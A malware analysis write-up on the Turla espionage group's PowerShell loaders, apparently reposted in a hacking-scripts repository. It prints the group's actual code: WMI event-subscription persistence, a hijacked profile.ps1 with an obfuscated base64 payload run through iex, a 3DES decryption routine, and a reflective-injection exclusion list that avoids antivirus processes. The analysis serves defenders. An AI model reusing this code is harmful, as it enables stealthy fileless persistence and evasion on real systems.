## Short Intro about Turla Group 
As an part of <a href="https://github.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters/blob/main/README.md#rwh-series" > RWH Series </a>
<center>
<img src="https://www.zdnet.com/a/img/resize/b2ece7ee9a54b36a8179d10f7c701b4d76f13bfb/2020/05/26/42726986-842a-4ad2-b22e-920bae7afb0d/turla.jpg?auto=webp&fit=crop&height=900&width=1200" height=200 /> 
</center>

**Turla**, also known as Snake, is an infamous espionage group recognized for its complex malware. To confound
detection, its operators recently started using PowerShell scripts that provide direct, in-memory loading and
execution of malware executables and libraries. This allows them to bypass detection that can trigger when a
malicious executable is dropped on disk.

Turla is believed to have been operating since at least 2008, when it successfully breached the US military. More
recently, it was involved in major attacks against the German Foreign Office and the French military.
This is not the first time Turla has used PowerShell in-memory loaders to increase its chances of bypassing security
products. In 2018, Kaspersky Labs published a report that analyzed a Turla PowerShell loader that was based on
the open-source project Posh-SecMod. However, it was quite buggy and often led to crashes.

After a few months, Turla has improved these scripts and is now using them to load a wide range of custom malware
from its traditional arsenal.

The victims are quite usual for Turla. We identified several diplomatic entities in Eastern Europe that were
compromised using these scripts. However, it is likely the same scripts are used more globally against many
traditional Turla targets in Western Europe and the Middle East. Thus, this blogpost aims to help defenders counter
these PowerShell scripts. We will also present various payloads, including an RPC-based backdoor and a backdoor
leveraging OneDrive as its Command and Control (C&C) server.

### Turla's PowerShell Loader

The PowerShell loader has three main steps: persistence, decryption and loading into memory of the embedded
executable or library

#### Persistence
The PowerShell scripts are not simple droppers; they persist on the system as they regularly load into memory only

the embedded executables. We have seen Turla operators use two persistence methods:

- A Windows Management Instrumentation (WMI) event subscription
- Alteration of the PowerShell profile (profile.ps1 file).

#### Windows Management Instrumentation
In the first case, attackers create two WMI event filters and two WMI event consumers. The consumers are simply
command lines launching base64-encoded PowerShell commands that load a large PowerShell script stored in the
Windows registry. Figure 1 shows how the persistence is established.

```
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='Syslog Consumer'" |
Remove-WmiObject;
```
```
$NLP35gh = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments
@{name='Syslog
Consumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -
enc $HL39fjh";RunInteractively='false'};
```
```
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='Log Adapter Filter'"| Remove- WmiObject
```
```
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'Log Adapter'} | Remove-WmiObject;
```
```
$IT825cd = "SELECT * FROM __instanceModificationEvent WHERE TargetInstance ISA 'Win32_LocalTime' AND
TargetInstance.Hour=15 AND TargetInstance.Minute=30 AND TargetInstance.Second=40";
```
```
$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='Log
Adapter Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
```
```
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments
@{Filter=$VQI79dcf;Consumer=$NLP35gh};
```
```
Get-WmiObject __eventFilter -namespace root\subscription -filter "name='AD Bridge Filter'"| Remove-WmiObject;
```
```
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object {$_.filter -match 'AD
Bridge'} | Remove-WmiObject;
```
```
$IT825cd = "SELECT * FROM __instanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Perf‐
FormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300 AND TargetInstance.SystemUpTime
< 400";
```
```
$VQI79dcf = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{name='ADBridge Filter';EventNameSpace='root\CimV2';QueryLanguage='WQL';Query=$IT825cd};
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments
@{Filter=$VQI79dcf;Consumer=$NLP35gh};
```
#### Figure 1. Persistence using WMI

These events will run respectively at 15:30:40 and when the system uptime is between 300 and 400 seconds. The
variable $HL39fjh contains the base64-encoded PowerShell command shown in Figure 2. It reads the Windows
Registry key where the encrypted payload is stored, and contains the password and the salt needed to decrypt the
payload.

```
[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("<base64-encoded password and salt">)) |
iex ;[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((Get-ItemProperty '$ZM172da').'$WY79ad')) |
iex
```

#### Figure 2. WMI consumer PowerShell command

Finally, the script stores the encrypted payload in the Windows registry. Note that the attackers seem to use a
different registry location per organization. Thus, it is not a useful indicator to detect similar intrusions.

#### Profile.ps1

In the latter case, attackers alter the PowerShell profile. According to the <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.3&viewFallbackFrom=powershell-6" > Microsoft documentation </a> A PowerShell profile is a script that runs when PowerShell starts. You can use the profile as a logon script to
customize the environment. You can add commands, aliases, functions, variables, snap-ins, modules, and
PowerShell drives.

**Figure 3 shows a PowerShell profile modified by Turla.**

```
try
{
    $SystemProc = (Get-WmiObject 'Win32_Process' | ?{$_.ProcessId -eq $PID} |  % {Invoke-WmiMethod -InputO‐
bject $_ -Name 'GetOwner'} | ?{(Get-WmiObject -Class Win32_Account -Filter "name='$($_.User)'").SID -eq "S-1-
5-18"})
    if ("$SystemProc" -ne "")
    {
      $([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')):
STARTED </m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append;
      [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("IABbAFMAeQBzAHQAZQBtAC4AVABlAH‐
gAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABTAHQAcgBpAG4AZwAo‐
AFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAIg‐
BKAEYAZABJAFIAegBRADQATQBXAFIAawBJAEQAMABuAFEAMQBsAEQAVgBEAE0ANQBNAHoAUQB3AFo‐
AbQBaAG8ASgB6AHMAZwBKAEUAWgBaAE4AVABKAGoAWgBUADAAbgBUAGsATgBEAFUAagBrADUATg‐
B6AEIAbwBaAG0AaABqAEoAegBzAGcASQBBAD0APQAiACkAKQAgAHwAIABpAGUAeAAgADsAWw‐
BUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGk‐
AbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBu‐
AGcAKAAoAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAnAEgASwBMAE0AOgBcAF‐
MATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwASQBuAHQAZQByAG4AZQB0ACAAR‐
QB4AHAAbABvAHIAZQByAFwAQQBjAHQAaQB2AGUAWAAgAEMAbwBtAHAAYQB0AGkAYgBpAGwAa‐
QB0AHkAXAB7ADIAMgA2AGUAZAA1ADMAMwAtAGYAMQBiADAALQA0ADgAMQBkAC0AYQBkADIANgAt‐
ADAAYQBlADcAOABiAGMAZQA4ADEAZAA3AH0AJwApAC4AJwAoAEQAZQBmAGEAdQBsAHQAKQAnACk‐
AKQAgAHwAIABpAGUAeAA=")) | iex | Out-Null;
      kill $PID;
    }
}
catch{$([Convert]::ToBase64String($([Text.Encoding]::ASCII.GetBytes("<m>$([DateTime]::Now.ToString('G')): $_
</m>") | %{ $_ -bxor 0xAA })) + "|") | Out-File 'C:\Users\Public\Downloads\thumbs.ini' -Append}
```
**Figure 3. Hijacked profile.ps1 file**

The base64-encoded PowerShell command is very similar to the one used in the WMI consumers.\

#### Decryption

The payload stored in the Windows registry is another PowerShell script. It is generated using the open-source script
<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1" > Out-EncryptedScript.ps1 </a> from the Penetration testing framework <a href="https://github.com/PowerShellMafia/PowerSploit" > PowerSploit </a>. In addition, the variable names are randomized to obfuscate the script, as shown in Figure 4.

```
$GSP540cd = "<base64 encoded + encrypted payload>";
$RS99ggf = $XZ228hha.GetBytes("PINGQXOMQFTZGDZX");
$STD33abh = [Convert]::FromBase64String($GSP540cd);
$SB49gje = New-Object System.Security.Cryptography.PasswordDeriveBytes($IY51aab,
$XZ228hha.GetBytes($CBI61aeb), "SHA1", 2);
[Byte[]]$XYW18ja = $SB49gje.GetBytes(16);
$EN594ca = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider;
$EN594ca.Mode = [System.Security.Cryptography.CipherMode]::CBC;
[Byte[]]$ID796ea = New-Object Byte[]($STD33abh.Length);
$ZQD772bf = $EN594ca.CreateDecryptor($XYW18ja, $RS99ggf);
$DCR12ffg = New-Object System.IO.MemoryStream($STD33abh, $True);
$WG731ff = New-Object System.Security.Cryptography.CryptoStream($DCR12ffg, $ZQD772bf,
[System.Security.Cryptography.CryptoStreamMode]::Read);
$XBD387bb = $WG731ff.Read($ID796ea, 0, $ID796ea.Length);
$OQ09hd = [YR300hf]::IWM01jdg($ID796ea);
$DCR12ffg.Close();
$WG731ff.Close();
$EN594ca.Clear();
return $XZ228hha.GetString($OQ09hd,0,$OQ09hd.Length);
```

**Figure 4. Decryption routine**
The payload is decrypted using the <a href="https://en.wikipedia.org/wiki/Triple_DES" > 3DES </a>  algorithm. The Initialization Vector, PINGQXOMQFTZGDZX in this
example, is different for each sample. The key and the salt are also different for each script and are not stored in the
script, but only in the WMI filter or in the profile.ps1 file.

### PE loader
The payload decrypted at the previous step is a PowerShell reflective loader. It is based on the script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" > InvokeReflectivePEInjection.ps1 </a> from the same PowerSploit framework. The executable is hardcoded in the script and is loaded directly into the memory of a randomly chosen process that is already running on the system . 

In some samples, the attackers specify a list of executables that the binary should not be injected into, as shown in
Figure 5

```
$IgnoreNames = @("smss.exe","csrss.exe","wininit.exe","winlogon.exe","lsass.exe","lsm.exe","svchost.exe","avp.exe","avpsus.exe","klnagent.exe","va
pm.exe","spoolsv.exe");
```

**Figure 5. Example list of excluded processes**

It is interesting to note that the names avp.exe, avpsus.exe, klnagent.exe and vapm.exe refer to Kaspersky Labs
executables. It seems that Turla operators really want to avoid injecting their malware into Kaspersky software.
